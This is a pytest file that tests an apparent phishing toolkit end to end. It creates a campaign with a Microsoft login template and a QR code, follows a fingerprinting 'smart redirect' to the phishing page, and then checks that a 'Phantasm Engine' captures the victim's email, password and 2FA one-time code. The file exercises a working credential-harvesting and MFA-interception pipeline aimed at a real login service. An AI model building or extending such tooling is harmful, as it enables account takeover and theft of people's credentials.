import pytest
import os
import shutil
from unittest.mock import MagicMock, patch
from fastapi.testclient import TestClient
from fastapi import FastAPI
from core.api.routes import router
from core.social.manager import social_manager
from core.session.session_manager import session_manager

# Setup App for testing
app = FastAPI()
app.include_router(router)

from core.cache.redis_manager import redis_cache

# Setup mock redis
@pytest.fixture
def mock_redis():
    # Store data in memory
    store = {}
    
    def set_val(key, value, expire=None):
        store[key] = value
        return True
        
    def get_val(key):
        return store.get(key)
        
    # Patch the methods on the existing instance
    with patch.object(redis_cache, "set", side_effect=set_val) as mock_set, \
         patch.object(redis_cache, "get", side_effect=get_val) as mock_get:
        yield {"set": mock_set, "get": mock_get}

@pytest.fixture
def client(mock_redis):
    return TestClient(app)

@pytest.fixture
def clean_artifacts():
    # Cleanup QR codes after test
    qr_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "assets", "qr_codes")
    if os.path.exists(qr_dir):
        shutil.rmtree(qr_dir)
    os.makedirs(qr_dir, exist_ok=True)
    yield
    # Cleanup again
    if os.path.exists(qr_dir):
        shutil.rmtree(qr_dir)

def test_full_phishing_flow(client, mock_redis, clean_artifacts):
    # 1. Create Campaign
    # We need to mock the template loader or ensure templates exist
    # For this test, we assume 'microsoft' template exists as verified before
    
    # Mock get_template_content to return simple content with placeholders
    with patch.object(social_manager, "get_template_content", return_value="<html>{{ session_id }}</html>"):
        with patch.object(social_manager, "templates", {"microsoft": MagicMock(target_url="https://login.microsoftonline.com")}):
            
            # Mock QR generation to avoid actual image processing if libs are missing, 
            # but let's try to use real one if possible. 
            # If qrcode lib is missing, we should mock it.
            try:
                import qrcode
            except ImportError:
                pytest.skip("qrcode library not installed")

            # Create campaign via API
            response = client.post("/v5/campaigns/create", data={
                "name": "Test Campaign",
                "template_id": "microsoft",
                "target_email": "victim@example.com"
            })
            
            assert response.status_code == 200
            data = response.json()
            assert data["status"] == "success"
            campaign = data["campaign"]
            campaign_id = campaign["id"]
            
            # Verify QR code path
            qr_path = campaign["qr_code_path"]
            assert "campaign_" in qr_path
            assert os.path.exists(qr_path) # Check if file was actually created
            
            # 2. Simulate User Click (Smart Redirect)
            # /v5/r/{campaign_id}
            headers = {
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br"
            }
            response = client.get(f"/v5/r/{campaign_id}", headers=headers)
            
            # Should redirect to /v5/phish/{campaign_id}/login or show template directly?
            # Smart redirector returns RedirectResponse or HTMLResponse
            # In our current logic (smart_redirector.py), it usually returns HTML with fingerprinting 
            # or redirect to phishing page.
            # Let's see what smart_redirector returns. 
            # If it returns a redirect, we follow it.
            
            if response.status_code == 302:
                redirect_url = response.headers["location"]
                assert "/login" in redirect_url or "/phish/" in redirect_url
                
                # Follow redirect
                # If it's absolute URL, we need to handle it, but it should be relative for internal
                if redirect_url.startswith("http"):
                    # Extract path
                    from urllib.parse import urlparse
                    path = urlparse(redirect_url).path
                    query = urlparse(redirect_url).query
                    redirect_url = f"{path}?{query}"
                
                response = client.get(redirect_url)
            
            assert response.status_code == 200
            # Check if session was created (implicitly or explicitly)
            # In routes.py: serve_phishing_page takes optional sid. 
            # If sid is passed, it uses it.
            
            # 3. Simulate Credential Capture (Phantasm Engine)
            # First, we need a session ID. 
            # If the redirect created one, we'd know. 
            # But let's create one manually for the test if needed, 
            # or check if one was created in redis.
            
            # Actually, let's create a session manually to be sure
            session_id = session_manager.create_session(campaign_id, "127.0.0.1", "Mozilla/5.0")
            
            # Step 1: Password Submission (JSON)
            payload = {
                "email": "victim@example.com",
                "password": "SuperSecretPassword"
            }
            
            response = client.post(f"/v5/auth/login?sid={session_id}", json=payload)
            assert response.status_code == 200
            resp_json = response.json()
            
            # Expect 2FA required because we sent password but no OTP
            assert resp_json["status"] == "2fa_required"
            
            # Check captured data
            session = session_manager.get_session(session_id)
            assert session["captured_data"]["email"] == "victim@example.com"
            assert session["captured_data"]["password"] == "SuperSecretPassword"
            
            # Step 2: OTP Submission
            payload_otp = {
                "otp": "123456"
            }
            
            response = client.post(f"/v5/auth/login?sid={session_id}", json=payload_otp)
            assert response.status_code == 200
            resp_json = response.json()
            
            # Expect success and redirect
            assert resp_json["status"] == "success"
            assert "redirect" in resp_json
            
            # Check captured OTP
            session = session_manager.get_session(session_id)
            assert session["captured_data"]["otp"] == "123456"

